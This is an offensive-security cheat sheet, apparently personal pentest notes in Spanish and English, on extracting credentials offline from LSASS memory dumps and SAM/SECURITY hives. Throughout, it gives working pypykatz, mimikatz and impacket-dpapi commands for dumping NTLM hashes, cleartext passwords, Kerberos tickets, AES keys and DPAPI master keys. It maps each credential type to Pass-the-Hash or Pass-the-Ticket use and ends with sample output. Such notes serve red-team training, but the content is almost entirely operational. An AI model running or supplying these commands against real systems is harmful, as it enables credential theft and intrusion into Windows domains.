---
aliases:
  - pypykatz
  - LSASS Offline Parse
  - lsass.dmp Parse
tags:
  - type/technique
  - technique/credential-access
  - env/windows
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: SubCheatSheet
linked:
  - '[[LSASS Dumping]]'
---
# LSASS Dumping - Offline Parsing

***

## pypykatz (Python — Linux/Mac)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `pypykatz lsa minidump lsass.dmp` | Parse dump → hashes + tickets + cleartext | Standard. |
| `pypykatz lsa minidump lsass.dmp -k <output-dir>` | Extract Kerberos tickets a directory | Pre-PtT. |
| `pypykatz lsa minidump lsass.dmp -o creds.txt` | Output a file | Pipeline. |
| `pypykatz lsa minidump lsass.dmp --json` | JSON format | Parsing. |
| `pypykatz lsa minidump lsass.dmp -p <kerberos-only>` | Filter packages | Targeted. |
| `pypykatz registry --system SYSTEM SAM` | SAM hive parse | Local hashes. |
| `pypykatz registry --system SYSTEM SECURITY` | LSA secrets parse | Cached creds. |
^lsass-offline-pypykatz

```bash
# Install
pip install pypykatz

# Parse standard
pypykatz lsa minidump lsass.dmp

# Output incluye:
# - msv credentials (NTLM hashes)
# - wdigest credentials (cleartext si legacy)
# - kerberos credentials (TGT/TGS exportables)
# - cloudap, ssp, livessp, credman

# Extract Kerberos tickets
pypykatz lsa minidump lsass.dmp -k tickets/
ls tickets/
# Output: <user>@<service>.kirbi files
```

___

## Mimikatz Offline Mode (Windows)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `mimikatz # sekurlsa::minidump <lsass.dmp>` | Load offline dump file | Pre-parse. |
| `mimikatz # sekurlsa::logonpasswords` (post-minidump) | Parse offline | Standard. |
| `mimikatz # sekurlsa::logonpasswords full` | Verbose | Detail. |
| `mimikatz # sekurlsa::tickets /export` (post-minidump) | Export tickets desde offline dump | Pre-PtT. |
| `mimikatz # sekurlsa::ekeys` (post-minidump) | AES keys offline | Modern auth. |
^lsass-offline-mimikatz

```cmd
:: Pipeline offline en Windows
mimikatz # sekurlsa::minidump C:\path\to\lsass.dmp
mimikatz # sekurlsa::logonpasswords full

:: Tickets export
mimikatz # sekurlsa::tickets /export
```

___

## Output Inspection

| **Tipo cred** | **Significa** | **Use case** |
|:---:|:---:|:---:|
| `msv` | NTLM hashes (LM:NT) | Pass-the-Hash. |
| `wdigest` | Cleartext password (legacy) | Direct auth. |
| `tspkg` | Cleartext (RDP-related) | Direct. |
| `kerberos` | Cleartext + TGT/TGS | Pass-the-Ticket / Overpass. |
| `ssp` | Custom SSP secrets | Edge. |
| `credman` | Credential Manager (RDP saved, etc) | Bonus creds. |
| `livessp` | LiveSSP (cloud/local) | Edge. |
| `cloudap` | Azure AD / cloud credentials | Hybrid envs. |
^lsass-offline-output

___

## Per-Session Filtering

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `pypykatz lsa minidump lsass.dmp \| grep -A 10 '== LogonSession ==' \| grep -A 5 'Username:'` | Filter por session | Targeted parse. |
| `pypykatz lsa minidump lsass.dmp --json \| jq '.[] \| select(.username == "<user>")'` | JSON filter | Programmatic. |
| `mimikatz # sekurlsa::logonpasswords /username:<user>` (offline) | Single user | Targeted. |
^lsass-offline-filter

```bash
# Quick parse + filter por user
pypykatz lsa minidump lsass.dmp -o creds.txt
grep -A 20 "Administrator" creds.txt
```

___

## Per-Package Extraction

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `pypykatz lsa minidump lsass.dmp --json \| jq '.[].kerberos_creds'` | Solo Kerberos tickets | Targeted. |
| `pypykatz lsa minidump lsass.dmp --json \| jq '.[].msv_creds'` | Solo NTLM | Hash only. |
| `pypykatz lsa minidump lsass.dmp --json \| jq '.[].wdigest_creds'` | Cleartext (legacy) | Direct. |
^lsass-offline-package

___

## DPAPI Master Key Extraction

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `pypykatz lsa minidump lsass.dmp` (output incluye DPAPI keys) | DPAPI master keys auto | DPAPI decryption pre-req. |
| `mimikatz # sekurlsa::dpapi` (offline) | DPAPI keys via mimikatz | Standard. |
^lsass-offline-dpapi

**Por qué útil:** DPAPI master keys decryptan:
- Browser saved passwords (Chrome, Edge, Firefox).
- Vault credentials (Windows Credential Manager).
- WiFi passwords saved.
- VPN credentials.

```bash
# Extract DPAPI master keys
pypykatz lsa minidump lsass.dmp | grep -A 5 "DPAPI"

# Use master key con additional tools (impacket-dpapi)
impacket-dpapi masterkey -file <encrypted-master> -mkfile <key>
```

___

## Cross-Reference: SAM + LSASS

```bash
# Pipeline completo offline parse local host
# Files extraidos: lsass.dmp + SAM + SYSTEM + SECURITY hives

# 1. SAM (local accounts)
pypykatz registry --system SYSTEM SAM

# 2. LSA Secrets (service accounts, cached)
pypykatz registry --system SYSTEM SECURITY

# 3. LSASS (active sessions)
pypykatz lsa minidump lsass.dmp

# Aggregate output
pypykatz lsa minidump lsass.dmp -o lsass_creds.txt
pypykatz registry --system SYSTEM SAM -o sam_creds.txt
pypykatz registry --system SYSTEM SECURITY -o lsa_creds.txt
```

___

## Common Errors

| **Error** | **Causa** | **Fix** |
|:---:|:---:|:---:|
| `Invalid minidump file` | Truncated dump / wrong file | Verify size + magic bytes (`MDMP`). |
| `Failed to parse` | Corrupted dump (write interrupted) | Re-dump on host. |
| Output sin entries | LSASS Protected en source | Modern protection. |
| `KeyError: 'msv_creds'` | Old dump format | Update pypykatz. |
| `pypykatz: command not found` | Not installed | `pip install pypykatz`. |
^lsass-offline-errors

___

## Output Format Examples

```
== LogonSession ==
authentication_id 12345 (BC614E)
session_id 1
username Administrator
domainname CORP
logon_server DC01
logon_time 2026-04-30T22:15:33.123456+00:00
sid S-1-5-21-...-500
luid 12345

== MSV ==
        Username: Administrator
        Domain: CORP
        LM: NA
        NT: aabbcc1122334455...
        SHA1: deadbeef...
        DPAPI: c0ffee...

== KERBEROS ==
        Username: Administrator
        Domain: CORP.LOCAL
        Password: <Encrypted>
        AESKey: 9988aabb...
```

***
